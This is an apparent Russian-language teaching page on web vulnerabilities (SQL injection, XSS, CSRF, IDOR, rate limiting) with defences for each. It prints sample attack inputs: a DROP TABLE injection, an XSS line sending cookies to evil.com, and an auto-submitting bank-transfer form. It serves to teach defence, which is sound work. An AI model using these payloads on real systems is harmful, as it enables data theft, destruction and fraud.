SQL-инъекция: как работает

Ввод пользователя попадает в SQL-запрос и меняет его логику.

Уязвимый код

query = "SELECT * FROM users WHERE name = '" + name + "'"

Что вводит злоумышленник

' OR '1'='1

Что получается

SELECT * FROM users WHERE name = '' OR '1'='1'
Условие '1'='1' всегда истинно → вернутся все пользователи. А ввод '; DROP TABLE users;-- удалит таблицу.

SQL-инъекция: защита

Правильно: параметризация

query = "SELECT * FROM users WHERE name = %s" cursor.execute(query, (name,))

Ввод не вставляется в строку запроса — он передаётся отдельно как параметр. База данных не выполняет его как SQL.

Правила

  • Никогда не конкатенируйте ввод в SQL
  • Используйте параметризованные запросы или ORM
  • Валидируйте ввод (тип, длина, формат)
  • Минимум прав у пользователя БД (не root)
Аналогия: параметризация — отдельное окошко для ввода, а не «вписать в тот же бланк». База данных знает, что это данные, а не команда.

XSS (Cross-Site Scripting)

Злоумышленник вставляет свой JavaScript в страницу, которую видят другие. Скрипт выполняется в браузере жертвы.

Уязвимый код

document.getElementById("comment").innerHTML = userInput;

Что вводит злоумышленник

<script>fetch('https://evil.com/steal?c='+document.cookie)</script>

Виды

  • Stored — скрипт сохранён на сервере (комментарий, профиль)
  • Reflected — скрипт в URL, срабатывает при переходе
  • DOM-based — скрипт в клиентском коде

XSS: защита

Правильно: текст, а не HTML

document.getElementById("comment").textContent = userInput;

Меры

  • Экранирование вывода: < → &lt;
  • textContent вместо innerHTML
  • CSP (Content-Security-Policy) — запрет встроенных скриптов
  • HttpOnly cookies — JS не может прочитать cookie
  • Валидация ввода
Аналогия: XSS — записка, подброшенная в общий ящик. Все, кто её прочитает, выполнят инструкцию.

CSRF (Cross-Site Request Forgery)

Чужой сайт заставляет браузер жертвы отправить запрос на доверенный сайт, где жертва уже авторизована. Браузер автоматически прикладывает cookies.

Как работает

<form action="https://bank.com/transfer" method="POST"> <input name="to" value="attacker"> <input name="amount" value="10000"> </form> <script>document.forms[0].submit()</script>
Браузер прикладывает cookie банка → банк выполняет перевод. Жертва не хотела этого.

Защита

  • CSRF-токен — уникальный токен в форме, проверяется на сервере
  • SameSite cookie — Strict/Lax, не отправляется с чужих сайтов
  • Проверка Origin/Referer
  • Не использовать GET для изменяющих действий

XSS vs CSRF

XSSCSRF
Что делаетВставляет скрипт в страницуЗаставляет браузер отправить запрос
Где выполняетсяВ браузере жертвыВ браузере жертвы (запрос)
Что крадётCookies, данные, сессиюВыполняет действия от имени жертвы
ЗащитаЭкранирование, CSP, HttpOnlyCSRF-токен, SameSite, Origin
Частая путаница: XSS — скрипт; CSRF — запрос. Разные механизмы, разные меры.

IDOR (Insecure Direct Object Reference)

Доступ к чужому объекту по ID, потому что проверки прав нет.

GET /api/orders/123 ← ваш заказ GET /api/orders/124 ← чужой заказ (если нет проверки)
Если сервер не проверяет, что заказ 124 принадлежит вам, — вы получите чужие данные.

Защита

  • Проверка прав на сервере для каждого запроса: «этот объект принадлежит этому пользователю?»
  • Не полагаться на «сложные» ID (UUID — не защита, а лишь усложнение)
Аналогия: вы знаете номер чужой ячейки в камере хранения — и открываете её, потому что замок не проверяет, чья она.

Правила

  • Всегда HTTPS
  • Короткоживущие токены + refresh
  • Scope/роли — минимум прав
  • Rate limiting — ограничение запросов
  • Валидация ввода на сервере

Rate limiting

Ограничение количества запросов от одного клиента за время (например, 100 запросов/минуту).

Зачем

  • Защита от брутфорса
  • Защита от DDoS
  • Защита от scraping (массового сбора данных)

Как

  • По IP, по токену, по пользователю
  • При превышении — 429 Too Many Requests
  • Заголовки: Retry-After

4. Кейс IDOR

API /api/orders/123 возвращает заказ. Как проверить, что пользователь имеет право на этот заказ?

Проверка на сервере: order.user_id == current_user.id. Если нет — 403 Forbidden.
